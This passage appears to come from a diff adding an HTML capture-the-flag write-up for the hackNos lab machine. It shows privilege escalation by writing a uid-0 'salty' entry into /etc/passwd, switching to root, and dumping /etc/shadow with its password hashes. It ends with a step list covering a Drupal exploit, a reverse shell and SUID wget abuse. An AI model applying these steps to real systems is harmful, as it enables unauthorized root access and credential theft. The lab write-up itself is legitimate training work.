+james:x:1000:1000:james,,,:/home/james:/bin/bash
+sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
+mysql:x:111:118:MySQL Server,,,:/nonexistent:/bin/false
+salty:$6$salty$TwLZ.kG/oqyEnXrhYGO8tQPAaX8GVJE5mhKgLSy9yKz7cNjaVNx3.7FtBVn4VEe.daS/nqBRwyEPpOr.jf228.:0:0:root:/:/bin/bash</code></pre>
+<h2 id="become-root">Become root</h2>
+<pre class="shell"><code>www-data@hackNos:/etc$ su salty
+su salty
+Password: password
+
+root@hackNos:/etc# whoami
+whoami
+root
+root@hackNos:/etc# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@hackNos:/etc# hostname
+hostname
+hackNos
+root@hackNos:/etc# date
+date
+Mon Jan  3 11:40:26 IST 2022
+root@hackNos:/etc# cd /root
+cd /root
+root@hackNos:/root# ls -la
+ls -la
+total 36
+drwx------  3 root root 4096 Nov 16  2019 .
+drwxr-xr-x 22 root root 4096 Oct 31  2019 ..
+-rw-------  1 root root  407 Nov 16  2019 .bash_history
+-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
+drwxr-xr-x  2 root root 4096 Oct 31  2019 .nano
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root  491 Nov 16  2019 root.txt
+-rw-------  1 root root 4141 Nov 16  2019 .viminfo
+root@hackNos:/root# cat root.txt
+cat root.txt
+    _  _                              _
+  _| || |_                           | |
+ |_  __  _|______  _ __  ___    ___  | |_
+  _| || |_|______|| &#39;__|/ _ \  / _ \ | __|
+ |_  __  _|       | |  | (_) || (_) || |_
+   |_||_|         |_|   \___/  \___/  \__|
+
+
+
+MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b
+
+Author : Rahul Gehlaut
+
+Linkedin : https://www.linkedin.com/in/rahulgehlaut/
+
+Blog : www.hackNos.com
+root@hackNos:/root# cat /etc/shadow
+cat /etc/shadow
+root:$6$ii3GEj5H$DHrrLj9Q9Bpux.aVR9fy1e240PyBPSI/yh5WGRUyN7TN7Ulb5rFO0CoAVRY8UYvdxhgw142tkmgyqubP4l1ta0:18216:0:99999:7:::
+daemon:*:17953:0:99999:7:::
+bin:*:17953:0:99999:7:::
+sys:*:17953:0:99999:7:::
+sync:*:17953:0:99999:7:::
+games:*:17953:0:99999:7:::
+man:*:17953:0:99999:7:::
+lp:*:17953:0:99999:7:::
+mail:*:17953:0:99999:7:::
+news:*:17953:0:99999:7:::
+uucp:*:17953:0:99999:7:::
+proxy:*:17953:0:99999:7:::
+www-data:*:17953:0:99999:7:::
+backup:*:17953:0:99999:7:::
+list:*:17953:0:99999:7:::
+irc:*:17953:0:99999:7:::
+gnats:*:17953:0:99999:7:::
+nobody:*:17953:0:99999:7:::
+systemd-timesync:*:17953:0:99999:7:::
+systemd-network:*:17953:0:99999:7:::
+systemd-resolve:*:17953:0:99999:7:::
+systemd-bus-proxy:*:17953:0:99999:7:::
+syslog:*:17953:0:99999:7:::
+_apt:*:17953:0:99999:7:::
+lxd:*:18200:0:99999:7:::
+messagebus:*:18200:0:99999:7:::
+uuidd:*:18200:0:99999:7:::
+dnsmasq:*:18200:0:99999:7:::
+james:$6$ImB2eoJe$bnE3xrR1mBD1WtBjccl2Nh74wqDqJtMklx1lTEJyouewzdWRICla32oHXz9YNq0hImAoCSkM2tRyvQhxEuO9e.:18216:0:99999:7:::
+sshd:*:18200:0:99999:7:::
+mysql:!:18200:0:99999:7:::</code></pre>
+<figure>
+<img src="20.rooted.png" alt="" /><figcaption>20.rooted</figcaption>
+</figure>
+<h2 id="how-to-root">How to root</h2>
+<ol type="1">
+<li>fuzz web, decode and execute to get useless credentials. Don’t do this.</li>
+<li>Find /drupal/robots.txt</li>
+<li>Find admin login url</li>
+<li>Find exploit against drupal version</li>
+<li>Get reverse shell</li>
+<li>Find SUID binary</li>
+<li>Mangle /etc/passwd</li>
+<li>Be root</li>
+</ol>
+<h2 id="what-i-could-have-done-diffrently">What I could have done diffrently</h2>
+<h3 id="fuzz">fuzz</h3>
+<pre class="shell"><code>gobuster dir --url http://$RHOST -x js,png,py,txt,php,log,bak --wordlist=/usr/share/wordlists/wfuzz/general/big.txt -b 404,403 -q
+/alexander.txt        (Status: 200) [Size: 393]
+</code></pre>
+<p>But this was useless.</p>
+<h3 id="attack-via-wget-earlier.">attack via wget earlier.</h3>
+<p>Once I realized wget was in SUID list, (it took time to click), I rememberd an attack on passwd file.</p>
+<p>After realizing wget, it took me 2 minutes to root.</p>
+<p>Rooted.</p>
+</body>
+</html>
